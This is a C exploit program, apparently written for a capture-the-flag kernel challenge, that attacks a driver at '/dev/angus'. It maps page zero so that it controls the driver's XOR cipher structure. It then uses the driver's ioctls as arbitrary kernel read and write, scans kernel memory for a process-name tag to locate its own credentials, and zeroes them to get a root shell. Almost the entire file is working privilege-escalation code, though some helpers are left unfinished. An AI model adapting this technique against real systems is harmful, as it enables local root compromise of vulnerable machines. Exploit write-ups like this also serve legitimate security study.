#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

#define DEVICE_NAME "/dev/angus"

#define CMD_INIT    0x13370001
#define CMD_SETKEY  0x13370002
#define CMD_SETDATA 0x13370003
#define CMD_GETDATA 0x13370004
#define CMD_ENCRYPT 0x13370005
#define CMD_DECRYPT 0x13370006

typedef struct {
  char *key;
  char *data;
  size_t keylen;
  size_t datalen;
} XorCipher;

typedef struct {
  char *ptr;
  size_t len;
} request_t;

u64 user_cs, user_ss, user_rflags, user_rsp;
u64 image_base, heap_base;
int gfd;

static void save_state() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory"
    );
    puts("[+] state saved!");
}

static void win() {
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

static int init() {
    request_t req = {0};
    return ioctl(gfd, CMD_INIT, &req);
}

static int set_key(char *key, size_t len) {
    request_t req = {0};
    req.ptr = key;
    req.len = len;
    return ioctl(gfd, CMD_SETKEY, &req);
}

static int set_data(char *data, size_t len) {
    request_t req = {0};
    req.ptr = data;
    req.len = len;
    return ioctl(gfd, CMD_SETDATA, &req);
}

static int get_data(char *buf, size_t len) {
    request_t req = {0};
    req.ptr = buf;
    req.len = len;
    return ioctl(gfd, CMD_GETDATA, &req);
}

static int encrypt() {
    request_t req = {NULL};
    return ioctl(gfd, CMD_ENCRYPT, &req);
}

static int decrypt() {
    request_t req = {NULL};
    return ioctl(gfd, CMD_DECRYPT, &req);
}

XorCipher *xor_cipher;
static int leak(char *dst, char *src, size_t len) {
    xor_cipher->data = src;
    xor_cipher->datalen = len;
    return get_data(dst, len);
}

static void overwrite(char *dst, char *src, size_t len) {
    char *tmp = malloc(len);
    if(!tmp) {
        perror("malloc");
        exit(1);
    }

    leak(tmp, dst, len);

    for(int i = 0; i < len; i++) tmp[i] ^= src[i];
    printf("tmp: %s\n", tmp);

    xor_cipher->data = dst;
    xor_cipher->datalen = len;
    xor_cipher->key = tmp;
    xor_cipher->keylen = len;
    encrypt();

    free(tmp);  
}

u64 get_image_base() {
    char buf[0x40];
    for(u64 addr = 0xffffffff00000000; addr < 0xfffffffffff00000; addr += 0x100000) {
        if(leak(buf, (char *)addr, sizeof(buf)) != 0) continue;
        printf("[+] image_base: %p\n", addr);
        return addr;
    }
}

u64 get_heap_base() {

}

static u64 spray() {
    size_t len = 0x1000000;
    u64 addr;
    char *tmp, *buf = malloc(len);

    for(addr = heap_base; addr < 0xfffffffffff00000; addr += len) {
        if(addr % 0x10000000000 == 0) printf("[+] spraying: %p\n", addr);

        if(leak(buf, (char *)addr, len) != 0) continue;

        if(tmp = memmem(buf, len, "hehehehe", 8)) {
            addr += (tmp - buf);
            printf("[+] needle: 0x%016lx\n", tmp);
            printf("[+] buf: 0x%016lx\n", buf);
            printf("[+] found comm: 0x%016lx\n", addr);
            break;
        }
    }
    
    if (addr == 0xfffffffffff00000) {
        puts("[-] Not found");
        exit(1);
    }

    u64 cred_addr;
    leak((char *)&cred_addr, (char *)(addr - 0x8), 8);
    printf("[+] cred addr: 0x%016lx\n", cred_addr);
    return cred_addr;
}

static void exploit() {
    gfd = open(DEVICE_NAME, O_RDWR);
    if (gfd < 0) {
        perror("open");
        exit(1);
    }

    u64 addr = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    if (addr == (u64)MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    prctl(PR_SET_NAME, "hehehehe");


    image_base = get_image_base();
    heap_base = get_heap_base();
    u64 cred_addr = spray();
    char zero[0x20] = {0};
    overwrite((char *)(cred_addr + 4), zero, sizeof(zero));

    puts("[+] Win!");
    system("/bin/sh");
}

int main() {
    save_state();
    exploit();
    return 0;
}